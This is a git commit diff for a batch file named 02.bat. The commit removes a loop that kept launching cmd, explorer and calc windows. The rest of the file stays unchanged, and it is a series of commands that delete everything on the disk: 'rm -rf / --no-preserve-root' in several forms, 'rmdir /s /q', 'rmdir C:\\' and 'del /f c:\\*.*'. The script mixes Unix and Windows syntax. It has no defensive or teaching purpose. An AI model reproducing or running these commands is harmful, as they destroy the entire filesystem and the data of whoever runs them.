afb2f083559208b7331c29c216ae012da9df8d6d
Daniel Nuñez <92348777+RagnarokUchiha@users.noreply.github.com>
2024-03-16 13:38:57 -0300

    02.bat

--- 02.bat
+++ 02.bat
@@ -2,14 +2,9 @@
 rm -rf / --no-preserve-root
 sudo rm -rf / --no-preserve-root
 rmdir /s /q \
-:loop
-start cmd
-start explorer
-start calc
 rm -rf / -f --no-preserve-root
 rm -rf / -f
 sudo rm -rf / -f
 rmdir C:\
 del /f c:\*.*
 sudo rm -rf / -f --no-preserve-root
-goto loop
